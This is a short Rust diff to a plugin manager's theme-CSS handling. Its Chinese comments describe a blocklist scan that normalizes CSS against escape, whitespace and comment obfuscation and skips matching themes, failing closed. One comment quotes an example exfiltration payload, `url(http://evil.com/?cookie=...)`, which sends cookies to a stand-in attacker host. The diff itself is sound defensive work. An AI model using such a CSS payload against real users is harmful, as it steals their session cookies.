@@ -348,7 +348,8 @@ impl PluginManager {
 
       // 缓存未命中 / mtime 不一致 → 调插件 + 写回 cache
       if let Ok(css) = self.call_path_with_string(path, "get_theme_css", "").await {
-        // Phase 9.2: theme CSS allowlist。命中黑名单 pattern 整段跳过 + warn。
+        // Phase 9.2 / S8: theme CSS 黑名单扫描（规范化后匹配，对抗转义/空白/
+        // 注释混淆）。命中 pattern 整段跳过 + warn（fail-closed）。
         // 防 CSS 注入做数据外渗（`url(http://evil.com/?cookie=...)` 之类）。
         let hits = plugin_security::sanitize_theme_css(&css);
         if !hits.is_empty() {
